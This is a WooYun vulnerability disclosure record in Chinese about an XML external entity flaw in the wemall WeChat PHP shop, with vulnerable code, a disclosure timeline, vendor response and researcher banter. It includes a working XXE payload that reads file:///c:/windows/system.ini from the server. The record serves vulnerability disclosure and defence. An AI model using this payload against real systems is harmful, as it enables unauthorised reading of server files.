{"id": 432, "wybug_id": "wooyun-2014-069949", "wybug_title": "wemall微信开源PHP商城系统xml实体注入", "wybug_corp": "wemall微信开源PHP商城系统", "wybug_author": "roker", "wybug_date": "2014-07-28 09:35", "wybug_open_date": "2014-10-26 09:36", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向公众公开  简要描述： WeMall提供最好用、最方便的微信接口,微信会员卡、优惠券、大转盘、团购、一战到底、微网站、微相册、在线预订,一应俱全。让你运营微信得心应手!。。。 详细说明：  weixin.php\nif (! isset ( $_GET ['echostr'] )) {\t$wechatObj->responseMsg ();} else {\t$wechatObj->valid();}    public function responseMsg()    {\t\t//get post data, May be due to the different environments\t\t$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];      \t//extract post data\t\tif (!empty($postStr)){ \t\t              \t$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);                $fromUsername = $postObj->FromUserName;                $toUsername = $postObj->ToUserName;                $keyword = trim($postObj->Content);                $time = time();                $event = $postObj->Event;                $textTpl = \"<xml>\t\t\t\t\t\t\t<ToUserName><![CDATA[%s]]></ToUserName>\t\t\t\t\t\t\t<FromUserName><![CDATA[%s]]></FromUserName>\t\t\t\t\t\t\t<CreateTime>%s</CreateTime>\t\t\t\t\t\t\t<MsgType><![CDATA[%s]]></MsgType>\t\t\t\t\t\t\t<Content><![CDATA[%s]]></Content>\t\t\t\t\t\t\t<FuncFlag>0</FuncFlag>\t\t\t\t\t\t\t</xml>\";                                  $newsTpl = \"<xml>\t\t\t\t\t\t\t<ToUserName><![CDATA[%s]]></ToUserName>\t\t\t\t\t\t\t<FromUserName><![CDATA[%s]]></FromUserName>\t\t\t\t\t\t\t<CreateTime>%s</CreateTime>\t\t\t\t\t\t\t<MsgType><![CDATA[%s]]></MsgType>\t\t\t\t\t\t\t<ArticleCount>1</ArticleCount>\t\t\t\t\t\t\t<Articles>\t\t\t\t\t\t\t<item>\t\t\t\t\t\t\t<Title><![CDATA[%s]]></Title>\t\t\t\t\t\t\t<Description><![CDATA[%s]]></Description>\t\t\t\t\t\t\t<PicUrl><![CDATA[%s]]></PicUrl>\t\t\t\t\t\t\t<Url><![CDATA[%s]]></Url>\t\t\t\t\t\t\t</item>\t\t\t\t\t\t\t</Articles>\t\t\t\t\t\t\t</xml>\";\t\t\t\tif(!empty( $keyword ))                {\t\t\t\t          \t\t\t$msgType = \"news\";                \t$Url =  $this->appurl.$fromUsername;                \t$resultStr = sprintf($newsTpl, $fromUsername, $toUsername, $time, $msgType, $this->title,  $this->description, $this->picurl, $Url);                \techo $resultStr;                }else{                \t     。。。。。。。。。。。。。。。\n当 get echostr为空时 执行responseMsg函数。$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];接收数据后 $keyword = trim($postObj->Content);keyword不为空 则 $resultStr = sprintf($newsTpl, $fromUsername, $toUsername, $time, $msgType, $this->title,  $this->description, $this->picurl, $Url);                \techo $resultStr;我们 post 提交 \n<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE copyright [<!ENTITY test SYSTEM \"file:///c:/windows/system.ini\">]><xml><ToUserName>&test;</ToUserName><FromUserName>111</FromUserName><CreateTime>1402550611</CreateTime><MsgType>123</MsgType><FuncFlag>0</FuncFlag><Content>123</Content></xml>\n成功读取文件\n\n   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-08-02 09:21 厂商回复：   最新状态： 2014-08-04：补充处置情况：CNVD确认所述风险，但未能建立与软件开发者的直接处置联系渠道，待认领。  ", "replys": "漏洞评价：\n评论\n     2014-07-28 09:44 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  叼。    \n     2014-07-28 09:47 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  洞主你为何这么牛B，每次都是大厂商    \n     2014-07-28 10:47 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  wemall是大厂商！速度上！！    \n     2014-07-28 10:52 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @phith0n   马上到家  请留给我    \n     2014-07-28 10:55 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @′  雨。 开个玩笑，白天我都没时间挖洞，你上吧    \n     2014-07-28 10:58 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @phith0n   哈哈  我也是，  还没放假 快放了    \n     2014-07-28 12:53 |    \t\tAuthuir \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 爱生活，爱安全。)\t\t \n  洞主为何这么叼    \n     2014-07-28 13:02 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @phith0n @贫道来自河北 为何要嘲讽我。。大厂商你妹。。    \n     2014-07-28 13:11 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @roker 洞主是不是和审核员有一腿，为啥你发的是大厂商，我发就小厂商    \n     2014-07-28 13:12 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @贫道来自河北    潜规则    \n     2014-07-28 13:16 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @′  雨。 潜潜更健康    \n     2014-07-28 13:17 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n   @′  雨。 雨柔么么哒    \n     2014-07-28 13:43 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @roker 没嘲讽啊。。。我也不知道wemall是不是大厂商    \n     2014-08-02 09:23 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @phith0n 漏洞有质量 并不完全是根据厂商来的    \n     2014-08-02 19:38 |    \t\t小震 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | ~)\t\t \n  三个人的工作室。。主站用的百度云。域名是百度云二级域名。。还是挺大规模的。    \n     2014-08-02 21:45 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @小震 咳咳。。。牙买碟    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}